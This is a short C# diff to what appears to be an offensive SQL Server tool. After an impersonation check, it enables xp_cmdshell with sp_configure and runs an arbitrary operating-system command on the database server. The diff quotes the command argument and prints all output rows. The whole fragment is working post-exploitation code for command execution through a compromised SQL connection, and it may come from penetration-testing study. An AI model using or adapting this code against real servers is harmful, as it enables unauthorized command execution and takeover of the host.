@@ -12,7 +12,7 @@ namespace SQL
             if (impersonation(con))
             {
                 String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
-                String execCmd = $"EXEC xp_cmdshell {cmd}";
+                String execCmd = $"EXEC xp_cmdshell '{cmd}'";
 
 
                 SqlCommand command = new SqlCommand(enable_xpcmd, con);
@@ -21,8 +21,12 @@ namespace SQL
 
                 command = new SqlCommand(execCmd, con);
                 reader = command.ExecuteReader();
-                reader.Read();
-                Console.WriteLine("Result of command is: " + reader[0]);
+                Console.WriteLine("Result of command is: " );
+                while (reader.Read())
+                {
+                    Console.WriteLine(reader[0]);
+                }
+                
                 reader.Close();
             }
         }
